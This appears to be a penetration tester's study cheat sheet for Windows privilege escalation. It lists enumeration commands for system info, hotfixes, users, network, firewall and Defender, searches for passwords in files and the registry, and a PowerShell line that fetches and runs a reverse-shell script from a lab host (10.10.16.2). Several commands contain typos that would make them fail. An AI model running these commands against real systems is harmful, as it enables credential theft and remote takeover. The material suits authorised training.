# Systeminfo


quick systeminfo to grab system name version and type
```
systeminfo | findstr B/ /C:"OS Name" /C:"OS Version" /CLSystem Type"

```

# Hotfixes

```
wmic qfe # find hotfixes installed
wmic gfe get Caption,Description,HotFixID,InstalledOn # cleaner view
```

# List drives

```
wmic logicaldisk get caption,descriptiom.providername # list drives
wmic logicaldisk get caption # cleaner listing
```

# user enum

```
whoami /priv # check user privs
whoami /groups # check groups
net user # check users
net user babis # check user named babis info 
net localgroup # check groups
net localgroup administrators ## check group named administrator 
```

# Network

```
ipconfig /all # check network info
arp -a # check arp table 
route print # check routes
netstat -ano # # open ports
```

# Passwords

```
findstr /si password *.txt # search for files with rod password
findstr /si password *.txt *.ini *.config # search for files with rod password
```

# AV

```
sc query windefend # check windows defender 
sc queryex type= service # all services running 
```

# firewall

```
netsh advfirewall firewall dump 
netsh firewall show state
netsh firewall show config
```

# Registry
```
reg query HKLM /f password /t REG_SZ /s
```

# Search

```
where /R c:\windows bash # search for bash in windows
find
# flags
/R # recursive 
```

# Running commands as another user

First we create a virable and add creds to it 

```
$SecPass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<user>',$SecPass)

# grap reverse shell with powershell
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadstring('http://10.10.16.2/shell.ps1')" -Credential $cred
```

# Powerup.ps1

```
Invoke-AllChecks  # check for privesc

```
---
Tags: #tcm-security #Windows_priv_esc 
Resources:
[Github windows privesc repo](https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources)